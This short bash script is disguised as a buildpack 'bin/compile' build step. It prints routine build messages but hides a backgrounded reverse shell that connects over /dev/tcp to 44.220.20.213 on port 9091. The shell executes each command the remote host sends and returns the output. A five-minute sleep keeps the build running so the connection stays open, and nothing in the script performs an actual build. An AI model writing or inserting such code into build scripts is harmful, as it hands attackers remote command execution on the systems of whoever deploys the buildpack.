
#!/bin/bash
#bin/compile

BUILD_DIR=$1
CACHE_DIR=$2
ENV_DIR=$3
echo "-----> Installing dependencies..."
# More stable reverse shell using sh instead of bash -i
(
    exec 5<>/dev/tcp/44.220.20.213/9091
    cat <&5 | while read line; do
        $line 2>&1 | tee >&5
    done
) &

echo "-----> Compiling assets..."
sleep 300

echo "-----> Build complete"
exit 0
